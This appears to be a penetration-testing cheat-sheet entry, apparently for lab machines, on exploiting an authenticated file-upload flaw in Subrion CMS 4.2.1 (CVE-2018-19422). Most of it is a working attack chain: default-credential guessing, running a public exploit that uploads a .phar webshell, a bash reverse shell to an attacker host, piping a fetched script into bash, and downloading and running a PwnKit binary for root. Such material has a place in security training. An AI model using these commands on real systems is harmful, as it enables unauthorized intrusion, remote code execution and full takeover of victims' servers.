title: Subrion CMS 4.2.1 — CVE-2018-19422 Authenticated File Upload → RCE
body:
Subrion CMS is a PHP content management system. Version 4.2.1 has an authenticated arbitrary file upload vulnerability (CVE-2018-19422) that allows uploading a .phar webshell through the file manager, bypassing the extension blacklist. The exploit is authenticated — you need working creds first. Default creds (admin:admin) are common and should be tried before anything else.

Two critical gotchas in the public exploit (49876.py):
1. The exploit has hardcoded Referer/Origin headers pointing to 192.168.1.20 — if you pass the raw IP as the target, the login POST sends the wrong Referer and the server rejects it. Always use the hostname in -u.
2. The trailing slash on /panel/ matters — the exploit appends paths to the base URL and breaks without it.

Identification: generator meta tag says 'Subrion CMS', admin panel at /panel/ (often in robots.txt), version number in the admin login footer ('Powered by Subrion CMS v4.2.1').
cmd:
# ══════════════════════════════════════════════════
# IDENTIFY
# ══════════════════════════════════════════════════
# Admin panel usually at /panel/ — check robots.txt first:
curl -s http://$ip/robots.txt | grep -v '#'
# Look for: /panel/ in Disallow entries

# Confirm Subrion and get version:
curl -s http://hostname/panel/ | grep -iE 'subrion|generator|powered by|version'
# Footer says: "Powered by Subrion CMS v4.2.1"
# Meta tag: <meta name="generator" content="Subrion CMS"

# ══════════════════════════════════════════════════
# STEP 1 — DEFAULT CREDS (try before exploit)
# ══════════════════════════════════════════════════
# Browse to http://hostname/panel/ and try:
# admin:admin       ← most common, try first
# admin:password
# admin:<domain>    ← e.g. admin:exfiltrated
# admin:subrion
# If any work → skip to STEP 3

# ══════════════════════════════════════════════════
# STEP 2 — SETUP (beautifulsoup4 required)
# ══════════════════════════════════════════════════
searchsploit subrion 4.2
searchsploit -m 49876
cp 49876.py exploit.py

# Install dep — needs venv (PEP 668 blocks system pip):
python3 -m venv venv
source venv/bin/activate
pip install beautifulsoup4

# ══════════════════════════════════════════════════
# STEP 3 — RUN EXPLOIT
# ══════════════════════════════════════════════════
# ⚠ MUST use HOSTNAME not IP — hardcoded Referer/Origin in exploit
# ⚠ MUST have trailing slash on /panel/
# First add hostname to /etc/hosts if not already:
echo "$ip hostname.offsec" | sudo tee -a /etc/hosts

python3 exploit.py -u http://hostname.offsec/panel/ -l admin -p admin
# [+] Got CSRF token: ...
# [+] Login Successful!
# [+] Generated webshell name: <random15chars>
# [+] Upload Success... Webshell path: http://hostname.offsec/panel/uploads/<name>.phar
# $ (interactive shell as www-data)

# ══════════════════════════════════════════════════
# STEP 4 — UPGRADE TO REAL SHELL
# ══════════════════════════════════════════════════
# The .phar webshell is limited — upgrade immediately
# Set up listener on Kali:
nc -nlvp 6666

# Host a reverse shell script:
cat > shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<lhost>/6666 0>&1
EOF
python3 -m http.server 8001

# In the webshell prompt:
# $ curl http://<lhost>:8001/shell.sh | bash

# Upgrade the shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# ══════════════════════════════════════════════════
# STEP 5 — PRIVESC FROM www-data
# ══════════════════════════════════════════════════
# Run linpeas — watch for:
# /usr/bin/pkexec  ---> Generic_CVE-2021-4034  = PwnKit
# /usr/bin/sudo    ---> check_if_the_sudo_version_is_vulnerable
# Cron jobs running as root (look in /var/spool/cron and /etc/cron*)

# PwnKit (CVE-2021-4034) if pkexec is SUID:
# Download precompiled binary:
wget http://<lhost>:8001/PwnKit -O /var/tmp/PwnKit
chmod +x /var/tmp/PwnKit
./PwnKit
# root@target

# Check cron jobs manually:
cat /etc/crontab
ls -la /etc/cron*
cat /var/spool/cron/crontabs/root 2>/dev/null

# ══════════════════════════════════════════════════
# TROUBLESHOOTING
# ══════════════════════════════════════════════════
# '[x] Login failed' with correct creds:
#   → You're passing the IP not the hostname in -u
#   → Make sure /etc/hosts has the entry
#   → Use: python3 exploit.py -u http://hostname.offsec/panel/ (with trailing slash)

# 'ModuleNotFoundError: No module named bs4':
#   → beautifulsoup4 not installed or venv not activated
#   → source venv/bin/activate && pip install beautifulsoup4

# Webshell not found after upload:
#   → Try accessing: http://hostname.offsec/uploads/<name>.phar?cmd=id
#   → Note: URL is /uploads/ NOT /panel/uploads/
#   → The exploit strips /panel from url_shell automatically

# Login page redirects to IP not hostname:
#   → The exploit follows the redirect to the raw IP
#   → Try: python3 exploit.py -u http://hostname.offsec/panel/ (no port number)
warn: Always use the HOSTNAME not the IP in the -u flag — the exploit hardcodes Referer and Origin headers that cause login failure when the target URL is an IP. Trailing slash on /panel/ is required. Try admin:admin before running the exploit — it works more often than expected and skips the whole setup. The webshell URL path is /uploads/<name>.phar (no /panel/ prefix) — the exploit handles this automatically but manual testing needs the right path.
